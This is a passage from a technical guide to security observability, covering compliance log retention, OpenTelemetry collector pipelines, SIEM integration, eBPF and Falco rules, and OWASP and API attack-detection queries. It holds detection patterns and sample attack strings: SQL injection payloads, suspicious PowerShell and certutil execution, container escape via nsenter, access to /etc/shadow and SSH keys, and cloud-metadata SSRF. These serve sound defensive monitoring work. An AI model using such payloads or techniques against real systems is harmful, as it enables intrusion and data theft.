| **HIPAA** | 6 years (policies), no explicit log retention | Best practice: 6 years | Audit logs should be retained to match policy retention |
| **SOX** | 7 years (financial records) | Per audit needs | IT logs supporting financial controls |
| **GDPR** | No minimum (principle of data minimization) | Per processing purpose | Only retain as long as necessary for processing purpose |
| **SOC 2** | Per organizational policy (typically 1 year) | Per audit period | Must cover the audit period (6-12 months) |
| **NIST 800-53** | Per organizational risk assessment (AU-11) | Per organizational needs | AU-11: "retain audit records for [Assignment: organization-defined time period]" |
| **ISO 27001** | Per risk assessment (typically 1-3 years) | Per operational needs | A.8.15 requires defined retention period |
| **FedRAMP** | 90 days minimum (per NIST guidance), typically 1 year | 90 days | Longer retention for incident-related logs |
| **NIS2** | Per member state transposition | Per operational needs | Varies by EU member state |
| **DORA** | 5 years (ICT-related incidents) | Per operational needs | Retain ICT incident records for 5 years |
| **SEC Regulation S-P** | 3 years (cybersecurity incidents) | Per operational needs | For financial institutions |
| **GLBA** | 5 years | Per operational needs | Financial institution records |

### 3.10 Automated Compliance Evidence Collection

```yaml
# Automated compliance evidence collection framework
automated_evidence_collection:
  architecture: |
    +------------------------------------------------------------------+
    |              Automated Evidence Collection Pipeline                |
    +------------------------------------------------------------------+
    |                                                                    |
    | Data Sources        Evidence Processor      Evidence Store         |
    | +-------------+     +------------------+     +-----------------+  |
    | | SIEM Queries |---->| Schedule &       |---->| Immutable       |  |
    | | API Calls    |     | Execute Queries  |     | Evidence Lake   |  |
    | | Config Dumps |     | Format Evidence  |     | (S3 + DynamoDB) |  |
    | | Scan Results |     | Hash & Sign      |     +-----------------+  |
    | +-------------+     | Map to Controls  |            |             |
    |                     +------------------+            v             |
    |                                               +-----------------+ |
    |                                               | Compliance      | |
    |                                               | Dashboard       | |
    |                                               | (GRC Platform)  | |
    |                                               +-----------------+ |
    +------------------------------------------------------------------+

  evidence_types:
    - type: "configuration_evidence"
      description: "Point-in-time snapshots of security configurations"
      examples:
        - "Firewall rule exports"
        - "IAM policy documents"
        - "Encryption settings"
        - "Network ACL configurations"
      collection_frequency: "Weekly or on change"

    - type: "operational_evidence"
      description: "Evidence of controls operating effectively over time"
      examples:
        - "SIEM alert statistics (volume, TPR, FPR, MTTR)"
        - "Vulnerability remediation timelines"
        - "Access review completion records"
        - "Backup success/failure logs"
        - "Patch management compliance rates"
      collection_frequency: "Daily aggregate, monthly report"

    - type: "testing_evidence"
      description: "Evidence of periodic control testing"
      examples:
        - "Penetration test reports"
        - "Disaster recovery test results"
        - "Tabletop exercise reports"
        - "Purple team exercise results"
      collection_frequency: "Per test schedule (quarterly/annual)"

  multi_framework_mapping:
    # Map evidence to multiple frameworks simultaneously
    evidence_control_map:
      "siem_alert_metrics":
        pci_dss: ["10.4.1", "10.4.1.1"]
        soc2: ["CC7.1", "CC7.2", "CC7.3"]
        nist_800_53: ["AU-6", "SI-4", "IR-5"]
        iso_27001: ["A.8.15", "A.8.16"]
        hipaa: ["164.312(b)"]

      "access_review_records":
        pci_dss: ["7.2.5"]
        soc2: ["CC6.2", "CC6.3"]
        nist_800_53: ["AC-2(3)", "AC-6(7)"]
        iso_27001: ["A.5.15", "A.8.2"]
        sox: ["ITGC-AC-01"]
        hipaa: ["164.312(a)"]

      "vulnerability_scan_results":
        pci_dss: ["11.3.1", "11.3.2"]
        soc2: ["CC7.1"]
        nist_800_53: ["RA-5", "SI-2"]
        iso_27001: ["A.8.8"]
        fedramp: ["RA-5"]

      "change_management_records":
        pci_dss: ["6.5.1", "6.5.2"]
        soc2: ["CC8.1"]
        nist_800_53: ["CM-3", "CM-4"]
        iso_27001: ["A.8.32"]
        sox: ["ITGC-CM-01"]
```

---

## 4. OpenTelemetry for Security

### 4.1 Security-Relevant OTel Signals and Semantic Conventions

OpenTelemetry was designed primarily for observability (performance, reliability) rather than security. However, OTel signals contain security-relevant data, and the OTel Collector can serve as a unified telemetry pipeline for security data alongside observability data.

#### Security-Relevant Semantic Conventions

```yaml
# OTel semantic conventions with security relevance
security_relevant_semconv:
  # HTTP attributes (trace + logs)
  http_attributes:
    - "http.request.method"         # Detect unusual HTTP methods (TRACE, DELETE)
    - "http.response.status_code"   # Detect 401/403 patterns (brute force, authz failures)
    - "http.request.header.user_agent"  # Detect scanning tools, bot traffic
    - "url.full"                    # Detect injection attempts, path traversal
    - "url.path"                    # Detect directory enumeration
    - "url.query"                   # Detect SQL injection, XSS payloads
    - "client.address"             # Source IP for geolocation, threat intel
    - "server.address"             # Target system identification

  # RPC/gRPC attributes
  rpc_attributes:
    - "rpc.system"                 # Protocol identification
    - "rpc.method"                 # API method called
    - "rpc.grpc.status_code"       # Error patterns

  # Database attributes
  db_attributes:
    - "db.system"                  # Database type
    - "db.statement"               # SQL/query text (CAUTION: may contain PII)
    - "db.operation"               # CRUD operation
    - "db.name"                    # Database name (identify sensitive DBs)
    - "db.user"                    # Database user (privilege analysis)

  # Network attributes
  network_attributes:
    - "network.transport"          # TCP/UDP
    - "network.peer.address"       # Remote IP
    - "network.peer.port"          # Remote port (detect unusual ports)
    - "server.port"                # Service port

  # User/Identity attributes (custom, not standard semconv)
  identity_attributes:
    - "enduser.id"                 # User identifier
    - "enduser.role"               # User role
    - "enduser.scope"              # Authorization scope
    - "session.id"                 # Session tracking

  # Exception/Error attributes
  error_attributes:
    - "exception.type"             # Error classification
    - "exception.message"          # Error details (may contain security info)
    - "exception.stacktrace"       # Stack trace (information leakage risk)
```

#### Using OTel Traces for Security Investigation

```yaml
# Security investigation using distributed traces
trace_security_patterns:

  attack_path_tracing:
    description: |
      When an application processes a malicious request, the distributed trace
      captures the entire path through the system -- from ingress to database.
      This is invaluable for security investigation.

    example_scenario: "SQL Injection Attack Path"
    trace_analysis: |
      Trace ID: abc123def456
      ├── Span: HTTP POST /api/users/search (API Gateway)
      │   ├── http.request.method: POST
      │   ├── url.path: /api/users/search
      │   ├── client.address: 203.0.113.42
      │   ├── http.request.header.user_agent: "sqlmap/1.7.2"  <-- INDICATOR
      │   └── http.response.status_code: 200
      │
      ├── Span: UserSearchService.search (Application)
      │   ├── enduser.id: "anonymous"
      │   ├── app.search_query: "' OR 1=1 --"  <-- INJECTION PAYLOAD
      │   └── duration: 2.3s  <-- Abnormally slow
      │
      ├── Span: PostgreSQL SELECT (Database)
      │   ├── db.system: postgresql
      │   ├── db.statement: "SELECT * FROM users WHERE name = '' OR 1=1 --'"  <-- INJECTED
      │   ├── db.operation: SELECT
      │   ├── db.rows_returned: 50000  <-- ALL ROWS RETURNED
      │   └── duration: 1.8s
      │
      └── Span: HTTP Response (API Gateway)
          ├── http.response.status_code: 200
          └── http.response.body.size: 12582912  <-- 12MB response (data dump)

    investigation_queries:
      # Jaeger/Tempo: Find traces with SQL injection indicators
      tempo_traceql: |
        { span.db.statement =~ ".*(' OR |1=1|UNION SELECT|;DROP ).*" }

      # Jaeger: Find traces from known scanner user agents
      jaeger_query: |
        service=api-gateway AND
        tag:"http.request.header.user_agent"="sqlmap*" OR
        tag:"http.request.header.user_agent"="nikto*" OR
        tag:"http.request.header.user_agent"="burp*"

  authentication_failure_analysis:
    description: "Trace authentication failures across distributed services"
    trace_pattern: |
      # Find credential stuffing by tracing auth failures
      { span.http.response.status_code = 401 } | rate() > 10/min

    otel_instrumentation: |
      # Custom span events for auth failures (Java example)
      Span currentSpan = Span.current();
      currentSpan.addEvent("authentication.failure", Attributes.of(
          AttributeKey.stringKey("auth.method"), "password",
          AttributeKey.stringKey("auth.failure_reason"), "invalid_credentials",
          AttributeKey.stringKey("auth.username"), sanitize(username),
          AttributeKey.stringKey("auth.source_ip"), request.getRemoteAddr(),
          AttributeKey.longKey("auth.attempt_number"), attemptCount
      ));
      currentSpan.setStatus(StatusCode.ERROR, "Authentication failed");

  data_exfiltration_detection:
    description: "Detect unusual data access patterns through trace analysis"
    indicators:
      - "Abnormally large response sizes (http.response.body.size)"
      - "Unusual query result counts (db.rows_returned)"
      - "Access to data outside normal scope"
      - "Bulk API calls in rapid succession"
    query: |
      # TraceQL: Find traces with unusually large data returns
      { span.db.rows_returned > 10000 && span.enduser.role != "admin" }
```

### 4.2 OTel Collector as Security Log Pipeline

The OTel Collector can serve as a powerful security log pipeline, replacing or augmenting traditional log shippers (Filebeat, Fluentd, rsyslog) with a vendor-neutral, extensible architecture.

```yaml
# OTel Collector configuration for security log pipeline
receivers:
  # System logs via filelog receiver
  filelog/auth:
    include:
      - /var/log/auth.log
      - /var/log/secure
    start_at: beginning
    operators:
      - type: regex_parser
        regex: '^(?P<timestamp>\w{3}\s+\d+\s+\d+:\d+:\d+)\s+(?P<hostname>\S+)\s+(?P<process>\S+?)(\[(?P<pid>\d+)\])?\s*:\s*(?P<message>.*)'
        timestamp:
          parse_from: attributes.timestamp
          layout: '%b %d %H:%M:%S'
      # Extract authentication events
      - type: router
        routes:
          - output: auth_success_parser
            expr: 'body matches "Accepted|session opened"'
          - output: auth_failure_parser
            expr: 'body matches "Failed|authentication failure|invalid user"'
      - id: auth_success_parser
        type: regex_parser
        parse_from: attributes.message
        regex: '(?P<auth_method>\S+)\s+for\s+(?P<user>\S+)\s+from\s+(?P<src_ip>\d+\.\d+\.\d+\.\d+)'
      - id: auth_failure_parser
        type: regex_parser
        parse_from: attributes.message
        regex: 'Failed\s+(?P<auth_method>\S+)\s+for\s+(?:invalid user\s+)?(?P<user>\S+)\s+from\s+(?P<src_ip>\d+\.\d+\.\d+\.\d+)'

  # Syslog receiver for network devices
  syslog/network:
    tcp:
      listen_address: 0.0.0.0:54527
    protocol: rfc5424
    operators:
      - type: add
        field: attributes.log_source
        value: "network_device"

  # Windows Event Log receiver
  windowseventlog/security:
    channel: Security
    operators:
      - type: filter
        expr: 'body.event_id.id in [4624, 4625, 4648, 4672, 4688, 4698, 4720, 4722, 4724, 4728, 4732, 4756, 4768, 4769]'

  # Journald receiver for systemd-based Linux
  journald/security:
    directory: /var/log/journal
    units:
      - sshd
      - sudo
      - systemd-logind
      - auditd
    priority: info

  # OTLP for application-instrumented security events
  otlp:
    protocols:
      grpc:
        endpoint: 0.0.0.0:4317
      http:
        endpoint: 0.0.0.0:4318

processors:
  # Enrich with threat intelligence
  transform/security_enrich:
    log_statements:
      - context: log
        statements:
          # Classify authentication events
          - set(attributes["security.event_type"], "authentication_success")
            where attributes["auth_method"] != nil and not IsMatch(body, "Failed|failure")
          - set(attributes["security.event_type"], "authentication_failure")
            where IsMatch(body, "Failed|failure|invalid")

          # Add severity classification
          - set(severity_text, "WARN")
            where attributes["security.event_type"] == "authentication_failure"
          - set(severity_text, "INFO")
            where attributes["security.event_type"] == "authentication_success"

  # Filter out noise (health checks, monitoring probes)
  filter/security_noise:
    logs:
      exclude:
        match_type: regexp
        body:
          - "healthcheck|health_check|readiness|liveness"
          - "Monitoring agent"
          - "CRON.*pam_unix.*session (opened|closed)"

  # Detect security patterns inline
  transform/security_detection:
    log_statements:
      - context: log
        statements:
          # Flag brute force patterns (will be correlated downstream)
          - set(attributes["security.detection"], "potential_brute_force")
            where attributes["security.event_type"] == "authentication_failure"

          # Flag privilege escalation
          - set(attributes["security.detection"], "privilege_escalation")
            where IsMatch(body, "sudo.*COMMAND|su: .* to root")

          # Flag suspicious process execution
          - set(attributes["security.detection"], "suspicious_execution")
            where IsMatch(body, "certutil|mshta|regsvr32|rundll32.*-e|powershell.*-enc")

  # Add resource attributes for compliance tagging
  resource/compliance:
    attributes:
      - key: compliance.frameworks
        value: "pci-dss,soc2,iso27001"
        action: upsert
      - key: environment
        value: "production"
        action: upsert
      - key: data.classification
        value: "security_log"
        action: upsert

  # Batch for efficiency
  batch/security:
    send_batch_size: 500
    timeout: 5s

exporters:
  # Primary: SIEM (Splunk HEC)
  splunkhec/security:
    token: "${SPLUNK_HEC_TOKEN}"
    endpoint: "https://splunk-hec.internal:8088"
    source: "otel-security-pipeline"
    sourcetype: "otel:security"
    index: "security"
    tls:
      insecure_skip_verify: false
      ca_file: /etc/ssl/certs/splunk-ca.pem

  # Secondary: Elasticsearch (Elastic Security)
  elasticsearch/security:
    endpoints: ["https://es-security.internal:9200"]
    logs_index: "security-logs"
    auth:
      authenticator: basicauth/es
    tls:
      ca_file: /etc/ssl/certs/es-ca.pem

  # Archive: S3 for long-term retention and compliance
  awss3/security_archive:
    s3uploader:
      region: us-east-1
      s3_bucket: security-logs-archive
      s3_prefix: "security"
      s3_partition: "year=%Y/month=%m/day=%d"
    marshaler: otlp_json

  # Real-time alerting: Kafka topic for streaming detection
  kafka/security_stream:
    brokers: ["kafka-security.internal:9092"]
    topic: "security-events"
    encoding: otlp_json

extensions:
  basicauth/es:
    client_auth:
      username: "${ES_USERNAME}"
      password: "${ES_PASSWORD}"

service:
  extensions: [basicauth/es]
  pipelines:
    logs/security:
      receivers:
        - filelog/auth
        - syslog/network
        - windowseventlog/security
        - journald/security
        - otlp
      processors:
        - filter/security_noise
        - transform/security_enrich
        - transform/security_detection
        - resource/compliance
        - batch/security
      exporters:
        - splunkhec/security
        - elasticsearch/security
        - awss3/security_archive
        - kafka/security_stream
```

### 4.3 Integrating OTel with SIEM Platforms

```yaml
# OTel-to-SIEM integration patterns
otel_siem_integrations:

  splunk:
    exporter: "splunkhec"
    configuration: |
      exporters:
        splunkhec/siem:
          token: "${SPLUNK_HEC_TOKEN}"
          endpoint: "https://splunk:8088/services/collector"
          source: "otel"
          sourcetype: "_json"
          index: "main"
          log_data_enabled: true
          profiling_data_enabled: false
          # Map OTel attributes to Splunk CIM fields
          hec_metadata:
            host: "{{ .ResourceAttributes.host.name }}"
            source: "{{ .ResourceAttributes.service.name }}"
            sourcetype: "otel:{{ .ResourceAttributes.service.name }}"
    field_mapping:
      otel_to_cim:
        "client.address": "src"
        "server.address": "dest"
        "enduser.id": "user"
        "http.response.status_code": "status"
        "http.request.method": "http_method"

  elastic:
    exporter: "elasticsearch"
    configuration: |
      exporters:
        elasticsearch/siem:
          endpoints: ["https://elasticsearch:9200"]
          logs_index: "logs-otel-security"
          traces_index: "traces-otel-apm"
          mapping:
            mode: ecs  # Map OTel semconv to Elastic Common Schema (ECS)
    field_mapping:
      otel_to_ecs:
        "client.address": "source.ip"
        "server.address": "destination.ip"
        "enduser.id": "user.name"
        "http.response.status_code": "http.response.status_code"
        "process.command_line": "process.command_line"
        "host.name": "host.name"

  microsoft_sentinel:
    method: "Azure Monitor Exporter or Log Analytics API"
    configuration: |
      exporters:
        azuremonitor/sentinel:
          connection_string: "${APPLICATIONINSIGHTS_CONNECTION_STRING}"
          # Alternatively, use Log Analytics Data Collector API
        # Or use OTLP -> Azure Data Collection Endpoint (DCE)
        otlphttp/sentinel:
          endpoint: "https://${DCE_ENDPOINT}.ingest.monitor.azure.com"
          headers:
            Authorization: "Bearer ${AZURE_TOKEN}"
          tls:
            insecure: false
    notes:
      - "Sentinel ingests via Log Analytics workspace"
      - "Use Data Collection Rules (DCR) to transform OTel data to Sentinel schema"
      - "Map OTel attributes to Sentinel/ASIM (Advanced Security Information Model)"

  google_chronicle:
    method: "Chronicle Ingestion API or Feeds"
    configuration: |
      exporters:
        # Chronicle uses UDM (Unified Data Model) -- ingest via HTTP API
        otlphttp/chronicle:
          endpoint: "https://malachiteingestion-pa.googleapis.com"
          headers:
            Authorization: "Bearer ${CHRONICLE_API_KEY}"
          # Requires UDM transformation
    notes:
      - "Chronicle uses UDM (Unified Data Model) format"
      - "Transform OTel events to UDM via OTel transform processor or Chronicle parser"
      - "Alternatively: OTel -> GCS bucket -> Chronicle feed ingestion"
```

### 4.4 OTel and eBPF for Security Monitoring

```yaml
otel_ebpf_security:
  overview: |
    eBPF (extended Berkeley Packet Filter) provides kernel-level observability without
    kernel modifications. When combined with OTel, it enables deep security monitoring
    that is difficult to evade because it operates below the application layer.

  security_use_cases:
    network_monitoring:
      description: "Capture all network connections at the kernel level"
      tools: ["Cilium/Hubble", "Falco", "Tetragon", "bpftrace"]
      otel_integration: |
        # Tetragon (Cilium) -> OTel Collector
        # Tetragon exports security events via gRPC or JSON
        receivers:
          filelog/tetragon:
            include: [/var/run/cilium/tetragon/tetragon.log]
            operators:
              - type: json_parser
                timestamp:
                  parse_from: attributes.time
                  layout: '%Y-%m-%dT%H:%M:%S.%LZ'

    process_execution:
      description: "Monitor all process execution and file access at kernel level"
      detection_capabilities:
        - "Container escape detection (namespace changes)"
        - "Privilege escalation (capability changes, setuid)"
        - "Fileless malware (execution from memory-mapped regions)"
        - "Hidden process detection"
        - "Cryptominer detection (specific syscall patterns)"
      falco_rules_example: |
        # Falco rule: Detect container escape via nsenter
        - rule: Container Escape via nsenter
          desc: Detect nsenter used to escape container namespace
          condition: >
            spawned_process and
            container and
            proc.name = "nsenter" and
            not proc.pname in (kubelet, containerd-shim)
          output: >
            Container escape detected
            (user=%user.name command=%proc.cmdline container=%container.name
             image=%container.image.repository ns=%proc.ns.pid)
          priority: CRITICAL
          tags: [container, mitre_privilege_escalation, T1611]

        # Falco rule: Detect cryptominer
        - rule: Detect Cryptomining Process
          desc: Detect processes commonly associated with cryptomining
          condition: >
            spawned_process and
            (proc.name in (xmrig, minerd, minergate, cpuminer) or
             proc.cmdline contains "stratum+tcp://" or
             proc.cmdline contains "stratum+ssl://")
          output: >
            Cryptomining process detected
            (user=%user.name command=%proc.cmdline container=%container.name)
          priority: CRITICAL
          tags: [cryptomining, mitre_resource_hijacking, T1496]

    file_access:
      description: "Monitor sensitive file access"
      otel_approach: |
        # Use OTel Collector filestats receiver + eBPF file monitoring
        # For real-time file access, Tetragon policy:
        apiVersion: cilium.io/v1alpha1
        kind: TracingPolicy
        metadata:
          name: sensitive-file-access
        spec:
          kprobes:
            - call: "security_file_open"
              syscall: false
              args:
                - index: 0
                  type: "file"
              selectors:
                - matchArgs:
                    - index: 0
                      operator: "Prefix"
                      values:
                        - "/etc/shadow"
                        - "/etc/passwd"
                        - "/etc/ssh/"
                        - "/root/.ssh/"
                        - "/var/run/secrets/"

  ebpf_otel_architecture: |
    +------------------------------------------------------------------+
    | eBPF + OTel Security Architecture                                 |
    +------------------------------------------------------------------+
    |                                                                    |
    | Kernel Space           User Space           Collection & Analysis |
    | +-----------+          +-------------+       +------------------+ |
    | | eBPF      |  events  | Tetragon/   | JSON/ | OTel Collector   | |
    | | Programs  |--------->| Falco/      | gRPC  | (filelog/otlp    | |
    | | (kprobes, |          | Hubble      |------>|  receiver)       | |
    | |  LSM,     |          +-------------+       |                  | |
    | |  tracepoints)        | User-space  |       | Transform +      | |
    | +-----------+          | agent       |       | Enrich +         | |
    |                        +-------------+       | Route            | |
    |                                              +--------+---------+ |
    |                                                       |           |
    |                                    +------------------+--------+  |
    |                                    |                  |        |  |
    |                                    v                  v        v  |
    |                              +---------+       +--------+ +----+ |
    |                              | SIEM    |       | Kafka  | | S3 | |
    |                              | (Splunk/|       | Stream | |    | |
    |                              |  Elastic)|      +--------+ +----+ |
    |                              +---------+                         |
    +------------------------------------------------------------------+
```

### 4.5 Limitations of OTel for Security

```yaml
otel_security_limitations:
  fundamental_limitations:
    - title: "Designed for observability, not security"
      detail: |
        OTel semantic conventions optimize for performance debugging, not threat detection.
        Security-specific fields (e.g., MITRE technique IDs, IoC indicators, threat scores)
        are not part of the standard schema and must be added as custom attributes.

    - title: "No built-in detection or correlation engine"
      detail: |
        OTel Collector processes telemetry but does not correlate events or detect threats.
        It is a pipeline, not a SIEM. Detection must happen downstream in SIEM/SOAR.

    - title: "Incomplete security log support"
      detail: |
        Many security log formats (CEF, LEEF, Windows Event XML, Sysmon) require custom
        parsing in the filelog receiver. Native parsers exist for some formats but coverage
        is not comprehensive compared to dedicated agents (Elastic Agent, Splunk UF).

    - title: "No native threat intelligence integration"
      detail: |
        OTel Collector has no built-in threat intelligence lookup (IP reputation, domain
        reputation, file hash lookup). This must be done via custom processors or downstream.

    - title: "Schema mapping challenges"
      detail: |
        Mapping OTel semantic conventions to SIEM schemas (Splunk CIM, Elastic ECS,
        Sentinel ASIM, Chronicle UDM) is non-trivial and may lose security-relevant context.

    - title: "No response/containment capabilities"
      detail: |
        OTel is strictly an observability/telemetry pipeline. It cannot take response
        actions (block IP, isolate host, disable account). SOAR integration required.

    - title: "Sampling conflicts with security"
      detail: |
        OTel encourages sampling for cost control. Security requires 100% log capture
        for compliance and forensics. Tail sampling can drop security-relevant traces.
        Security pipelines should NEVER use probabilistic sampling.

  recommended_architecture:
    description: "OTel as a complementary security pipeline, not a replacement for security-specific tools"
    pattern: |
      +-------------------------------------------------------------------+
      | Recommended: OTel + Security Tools Architecture                    |
      +-------------------------------------------------------------------+
      |                                                                     |
      | Application Layer:  OTel SDK instrumentation (traces, metrics, logs)|
      | Host Layer:         EDR agent (CrowdStrike, Defender, SentinelOne) |
      | Network Layer:      IDS/IPS (Suricata, Palo Alto) + network taps  |
      | Kernel Layer:       eBPF agents (Tetragon, Falco)                 |
      |                                                                     |
      | Collection:         OTel Collector (unified pipeline)              |
      |                     + Security-specific agents (EDR, NDR)          |
      |                                                                     |
      | Analysis:           SIEM (correlation, detection, investigation)   |
      |                     + SOAR (automated response)                    |
      |                     + Threat Intel Platform                        |
      |                                                                     |
      | OTel adds value for:                                               |
      |  - Application-layer security signals (traces, custom events)      |
      |  - Unified pipeline reducing agent sprawl                          |
      |  - Vendor-neutral format enabling multi-SIEM                       |
      |  - Correlation of performance + security signals                   |
      |                                                                     |
      | OTel does NOT replace:                                             |
      |  - EDR/XDR for endpoint security                                   |
      |  - NDR for network security                                        |
      |  - SIEM for detection and correlation                              |
      |  - SOAR for automated response                                     |
      +-------------------------------------------------------------------+
```

---

## 5. Application Security Observability

### 5.1 OWASP Top 10 Detection via Observability

The OWASP Top 10 (2021 edition) represents the most critical web application security risks. Observability can detect many of these attacks in real-time through log analysis, trace inspection, and metric anomalies.

```yaml
owasp_top_10_detection:
  "A01:2021 - Broken Access Control":
    description: "Users acting outside their intended permissions"
    detection_signals:
      - "HTTP 403 status codes in access logs (attempted unauthorized access)"
      - "Horizontal privilege escalation: User A accessing User B's resources"
      - "Vertical privilege escalation: Non-admin accessing admin endpoints"
      - "IDOR (Insecure Direct Object Reference): Sequential ID enumeration"
      - "Path traversal attempts (../ in URL)"
    detection_queries:
      idor_detection: |
        # Detect IDOR: User accessing many different resource IDs rapidly
        index=web_access uri_path="/api/users/*" OR uri_path="/api/orders/*"
        | rex field=uri_path "/api/\w+/(?<resource_id>\d+)"
        | stats dc(resource_id) as unique_resources count by user, uri_stem, span=5m
        | where unique_resources > 20 AND count > 50
        | eval detection="potential_idor_enumeration"

      path_traversal: |
        # Detect path traversal attempts
        index=web_access (uri_path="*..*" OR uri_path="*%2e%2e*" OR uri_path="*%252e*")
        | stats count by src_ip, uri_path, status
        | where count > 3

      horizontal_privesc: |
        # OTel trace analysis: User accessing resources owned by others
        { span.http.response.status_code = 200 &&
          span.enduser.id != span.resource.owner_id &&
          span.enduser.role != "admin" }

  "A02:2021 - Cryptographic Failures":
    detection_signals:
      - "HTTP (non-HTTPS) connections carrying sensitive data"
      - "Weak TLS versions (TLS 1.0, 1.1) in connection logs"
      - "Weak cipher suites in TLS handshake"
      - "Unencrypted database connections"
    monitoring: |
      # Prometheus: Monitor TLS version distribution
      - alert: WeakTLSVersion
        expr: |
          sum(rate(nginx_http_requests_total{ssl_protocol=~"TLSv1|TLSv1.1"}[5m])) /
          sum(rate(nginx_http_requests_total{ssl_protocol!=""}[5m])) > 0.01
        labels: { severity: warning, owasp: "A02" }
        annotations:
          summary: "More than 1% of requests using TLS 1.0/1.1"

  "A03:2021 - Injection":
    detection_signals:
      - "SQL injection patterns in request parameters"
      - "Command injection in user inputs"
      - "LDAP injection patterns"
      - "NoSQL injection patterns"
      - "Database error messages in responses (information leakage)"
    detection_queries:
      sql_injection: |
        # Detect SQL injection attempts in web logs
        index=web_access
        (uri_query="*' OR *" OR uri_query="*UNION SELECT*" OR
         uri_query="*; DROP*" OR uri_query="*1=1*" OR
         uri_query="*WAITFOR DELAY*" OR uri_query="*BENCHMARK(*")
        | stats count by src_ip, uri_path, uri_query
        | sort -count

      # OTel trace: SQL injection reaching database
      otel_trace: |
        { span.db.system = "postgresql" &&
          span.db.statement =~ ".*(UNION SELECT|; DROP|1=1|WAITFOR|BENCHMARK).*" }

  "A05:2021 - Security Misconfiguration":
    detection_signals:
      - "Default credentials in use"
      - "Unnecessary HTTP methods enabled (TRACE, DELETE, PUT)"
      - "Detailed error messages / stack traces in production responses"
      - "Missing security headers"
      - "Directory listing enabled"
    monitoring: |
      # Check for missing security headers
      security_header_checks:
        - header: "Strict-Transport-Security"
          check: "present and max-age >= 31536000"
        - header: "Content-Security-Policy"
          check: "present"
        - header: "X-Content-Type-Options"
          check: "nosniff"
        - header: "X-Frame-Options"
          check: "DENY or SAMEORIGIN"
        - header: "Referrer-Policy"
          check: "no-referrer or strict-origin-when-cross-origin"

  "A07:2021 - Identification and Authentication Failures":
    detection_signals:
      - "Credential stuffing: High-volume login attempts with varied usernames"
      - "Brute force: Repeated failed logins for same account"
      - "Session fixation: Session ID unchanged after authentication"
      - "Weak password usage: Passwords in breach databases"
    detection_queries:
      credential_stuffing: |
        # Detect credential stuffing (many usernames, one source)
        index=auth action=login status=failure
        | stats dc(username) as unique_users count by src_ip, span=10m
        | where unique_users > 20 AND count > 50
        | eval attack_type="credential_stuffing"

      brute_force: |
        # Detect brute force (one username, many attempts)
        index=auth action=login status=failure
        | stats count by username, src_ip, span=5m
        | where count > 10
        | eval attack_type="brute_force"

  "A10:2021 - Server-Side Request Forgery (SSRF)":
    detection_signals:
      - "Outbound requests to internal IPs (169.254.x.x, 10.x.x.x, 172.16-31.x.x)"
      - "Requests to cloud metadata endpoints (169.254.169.254)"
      - "DNS rebinding patterns"
    detection_queries:
      ssrf_metadata: |
        # Detect SSRF targeting cloud metadata
        index=proxy OR index=web_access
        (dest="169.254.169.254" OR uri_path="*/latest/meta-data*"
         OR uri_path="*/metadata/instance*"
         OR dest="metadata.google.internal")
        | stats count by src, dest, uri_path, user
```

### 5.2 WAF Observability

```yaml
waf_observability:
  aws_waf:
    log_source: "AWS WAF logs (via Kinesis Data Firehose to S3)"
    otel_collection: |
      receivers:
        awss3/waf:
          s3:
            region: us-east-1
            bucket: aws-waf-logs
            prefix: "AWSLogs/"
          sqs:
            queue_url: "https://sqs.us-east-1.amazonaws.com/123456789/waf-log-notifications"

    key_metrics:
      - "waf_requests_total{action=ALLOW|BLOCK|COUNT}"
      - "waf_blocked_by_rule{rule_group, rule_id}"
      - "waf_rate_limited_requests_total{rule_id}"
      - "waf_bot_control_requests{category, action}"
    dashboard_queries:
      top_blocked_rules: |
        index=aws_waf action=BLOCK
        | stats count by terminatingRuleId, terminatingRuleType
        | sort -count | head 20

      attack_origins: |
        index=aws_waf action=BLOCK
        | iplocation httpRequest.clientIp
        | stats count by Country, City
        | sort -count

  modsecurity:
    log_source: "ModSecurity audit log (JSON format)"
    otel_collection: |
      receivers:
        filelog/modsecurity:
          include: [/var/log/modsecurity/audit.log]
          operators:
            - type: json_parser
              timestamp:
                parse_from: attributes.transaction.time_stamp
                layout: '%d/%b/%Y:%H:%M:%S %z'
    crs_rule_categories: |
      # OWASP Core Rule Set (CRS) categories for dashboarding
      rule_categories:
        920xxx: "Protocol Enforcement"
        930xxx: "Local File Inclusion"
        931xxx: "Remote File Inclusion"
        932xxx: "Remote Code Execution"
        933xxx: "PHP Injection"
        934xxx: "Node.js Injection"
        941xxx: "Cross-Site Scripting (XSS)"
        942xxx: "SQL Injection"
        943xxx: "Session Fixation"
        944xxx: "Java Attacks"
        949xxx: "Inbound Anomaly Score"

  cloudflare_waf:
    log_source: "Cloudflare Logpush (R2/S3/HTTP endpoint)"
    key_fields:
      - "WAFAction: block, challenge, simulate, allow"
      - "WAFRuleID: triggered rule"
      - "WAFRuleMessage: human-readable description"
      - "EdgeResponseStatus: HTTP status returned"
    otel_integration: |
      # Cloudflare Logpush -> S3 -> OTel Collector
      receivers:
        awss3/cloudflare:
          s3:
            bucket: cloudflare-logs
            prefix: "waf/"
```

### 5.3 API Security Monitoring

```yaml
api_security_monitoring:
  rate_limiting_observability:
    metrics:
      - "api_rate_limit_hits_total{endpoint, client_id, policy}"
      - "api_rate_limit_remaining{endpoint, client_id}"
      - "api_requests_total{endpoint, method, status, client_id}"
    detection: |
      # Detect rate limit evasion (rotating IPs/keys)
      index=api_gateway status=429
      | stats dc(src_ip) as unique_ips dc(api_key) as unique_keys count
        by uri_path, span=10m
      | where unique_ips > 10 AND count > 100
      | eval detection="rate_limit_evasion"

  authentication_failure_monitoring:
    patterns:
      - name: "JWT token abuse"
        signals:
          - "Expired token usage (401 with 'token expired' message)"
          - "Invalid signature (token tampered)"
          - "Algorithm confusion (none, HS256 instead of RS256)"
        query: |
          index=api_gateway auth_error_type IN ("expired_token", "invalid_signature", "algorithm_mismatch")
          | stats count by auth_error_type, client_id, src_ip, span=5m
          | where count > 5

      - name: "OAuth/OIDC abuse"
        signals:
          - "Token reuse after revocation"
          - "Excessive token refresh"
          - "Scope escalation attempts"
        query: |
          index=auth_server (action="token_refresh" OR action="token_revoked_reuse")
          | stats count by client_id, user, action, span=1h
          | where count > 50

  bola_detection:
    description: "Broken Object Level Authorization (BOLA/IDOR) - OWASP API Security Top 1"
    detection_approach: |
      # Detect BOLA: User accessing resources belonging to other users
      # Requires application-level context (resource ownership)

      # Approach 1: Trace-based (OTel instrumentation)
      # Application adds resource.owner_id as span attribute
      { span.http.response.status_code = 200 &&
        span.resource.owner_id != span.enduser.id &&
        span.enduser.role != "admin" }

      # Approach 2: Log-based (API audit logs)
      index=api_audit action="read" resource_type="account"
      | where resource_owner != requesting_user AND requesting_user_role != "admin"
      | stats count dc(resource_id) as unique_resources by requesting_user, span=1h
